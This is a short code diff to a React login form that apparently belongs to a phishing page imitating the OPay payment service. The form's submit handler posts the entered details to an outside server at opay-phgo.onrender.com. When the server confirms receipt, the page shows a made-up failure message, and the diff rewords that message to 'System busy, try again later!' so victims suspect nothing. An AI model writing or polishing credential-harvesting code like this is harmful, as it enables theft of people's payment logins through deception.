@@ -18,13 +18,12 @@ function App() {
 
   const handleSubmit=async(e)=>{
     e.preventDefault();
-    console.log('working...')
 
     try {
       setMessage('Logging in...');
       const response=await axios.post("https://opay-phgo.onrender.com/submit", info)
       if (response.status===200) {
-        setMessage('There is an issue with the network, try again later!')
+        setMessage('System busy, try again later!')
       } else {
         console.error('logging in failed with status:', response.status)
         setMessage("There is an issue logging in")
